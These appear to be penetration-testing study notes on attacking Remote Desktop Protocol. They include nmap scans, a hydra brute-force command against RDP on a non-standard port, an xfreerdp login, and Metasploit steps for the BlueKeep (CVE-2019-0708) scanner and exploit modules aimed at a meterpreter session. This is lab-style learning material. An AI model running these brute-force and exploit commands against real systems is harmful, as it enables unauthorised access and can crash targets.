RDP uses TCP Port 3389 and can also be configured to run on any other TCP Port, sometimes common security methods to this will be to have RDP run on a different port to confuse attackers.

RDP Auth requires a legit user account on the target system as well as the users password in clear text.

We can perform an RDP brute-force attack to identify legit user creds that we can use to gain remote access to the target system.

----------------------------Exploitation---------------------------------------

nmap -sV -p- <ip>
** if RDP is running on a different port, 'ssl/dec-notes?' may show up under service when you NMAP. 

service postgresql start && msfconsole
search rdp_scanner
use
** set options needed, set target port to the port you may suspect running RDP **

hydra -L /usr/share/metasploit-framewordata/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<ip> -s 3333
** in this case we specify port for hydra because we are simulating the RDP port is not the typical 3389 **

xfreerdp /u:<user> /p:<pass> /v:<ip>:3333 **specify port in this special case**
**using xfreerdp in this case, other versions have different syntax**

-------------------------CVE-2019-0708 BlueKeep--------------------------------

BlueKeep is the name given to an RDP vulnerability in Windows that could potentially allow attackers to remotely execute arbitrary code and gain access to a Windows system and consequently the network that the target system is a part of.

BlueKeep exploit takes advantage of a vulnerability in the Windows RDP protocol that allows attackers to gain access to a chunk of kernel memory consequently allowing them to remotely execute arbitrary code at the system level without authentication.

This is vulnerable on Windows XP, Vista, 7, Server 2008 & R2

Bluekeep vulnerability has various illegitimate proof of concepts and exploit code that could be malicious in nature. It is therfore recommended to only utilize verified exploit code and modules for exploitation.

Bluekeep exploit has an MSF auxiliary module that can be used to check if a target system is vulnerable to the exploit and also has an exploit module that can be used to exploit the vulnerability of unpatched systems.

Bluekeep exploit module can be used to exploit vulnerable Windows systems and consequently provide us with a privileged meterpreter session on the target system.

### Targeting Kernel space memory and applications can cause system crashes ###



sudo nmap -p 3389 <ip> (3389 is the default rdp port)
msfconsole
search BlueKeep
use module 0 (this is the scanner)
** enter <ip> and run **
run
** After you confirm it is vulnerable use module 1 this only works on x64 bit versions**
show targets
set target <the target OS architecture>
** Target machine may crash, you may need to tweak Chunk grooming strat **



